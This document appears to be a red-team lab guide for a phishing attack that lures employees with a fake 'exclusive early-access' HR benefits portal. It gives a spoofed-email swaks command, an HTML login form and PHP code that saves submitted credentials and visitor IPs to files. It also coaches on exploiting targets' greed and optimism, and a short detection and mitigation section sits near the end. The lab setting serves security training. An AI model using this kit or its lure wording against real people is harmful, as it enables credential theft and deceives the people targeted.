## **Law 32 — Play to People’s Fantasies**

Interpretation (offensive context):  
Exploit aspirational desires—**rewards, recognition, exclusivity, shortcuts**. When the scenario aligns with what the target _wants_ to be true, verification drops.

---

# 🎯 Attack Scenario — _Exclusive Opportunity Portal (Aspirational Bait → Credential Capture)_

You present a **desirable outcome** (e.g., early bonus info / fast-track access) behind a login gate.

**Persona:**

> _Svetlana Orlova_, 20 y/o HR Programs Intern

---

# 🔴 Red Team Objective

- Maximize:
    
    - **engagement + credential submission**
        
- Leverage:
    
    - perceived upside (status/benefit)
        
- Keep:
    
    - low friction, believable context
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Fantasy Framing (Plausible, Role-Aligned)

Choose a **believable benefit** tied to the org:

- “Early access to revised benefits package”
    
- “Shortlist preview for performance bonus”
    
- “Fast-track enrollment window”
    

### Email:

```bash
swaks --to target@corp.local \
--from svetlana.o@corp.local \
--server 192.168.56.101 \
--data "Subject: Early access window

Hi,

You’ve been included in a limited early-access window for the updated benefits package.

Access here:
http://192.168.56.101:8080

— HR Programs"
```

👉 Tone:

- positive, not urgent
    
- exclusive, not pushy
    

---

## Phase 2 — Portal (Align UI With Promise)

On Kali:

```bash
mkdir fantasy && cd fantasy
```

```html
<h3>Benefits Early Access</h3>
<p>Sign in to view your personalized details.</p>
<form action="cap.php" method="POST">
  <input name="user" placeholder="Email">
  <input type="password" name="pass" placeholder="Password">
  <button>View Details</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
header("Location: /thanks.html");
?>
```

Optional “success” page:

```html
<h4>Thanks. Your details will be visible shortly.</h4>
```

---

## Phase 3 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 4 — Execution

Target:

- perceives upside (exclusive access)
    
- expects login gate
    
- submits credentials
    

👉 Desire → action without friction

---

# 🛠️ Tooling + Commands

### Delivery

```bash
swaks --to target@corp.local --from svetlana.o@corp.local
```

### Hosting

```bash
php -S 0.0.0.0:8080
```

### Capture (server-side)

```php
file_put_contents("creds.txt", ...)
```

### Basic access logging (optional)

```php
file_put_contents("hits.txt", $_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Incentive alignment** (user benefit first)
    
- **Expectation shaping** (login gate feels normal)
    
- **Cognitive bias: optimism/greed**
    

Key principle:

> If it matches what they want, they validate it for you

---

# 🛡️ Detection & Defensive Insight

Indicators:

- “exclusive/early access” claims without prior announcement
    
- login pages on **non-official hosts/IPs**
    
- HR/benefits links that bypass standard SSO
    

Mitigation:

- enforce:
    
    - **SSO-only** for HR/benefits portals
        
- comms control:
    
    - HR announcements via **known channels only**
        
- user training:
    
    - “Benefits/bonus access never starts from an emailed link”
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Aspirational Incentive Framing

### Include:

- email copy (benefit framing)
    
- portal UI aligned with promise
    
- captured credential sample (lab)
    
- analysis:
    
    - why “exclusive access” reduces scrutiny
        
- impact:
    
    - high engagement, low resistance compromise
        

---

# ⚠️ Operator Insight

Pressure-based attacks trigger caution.  
Desire-based attacks trigger **self-driven action**.

You’re not pushing the user—  
you’re **aligning with what they want**.

---

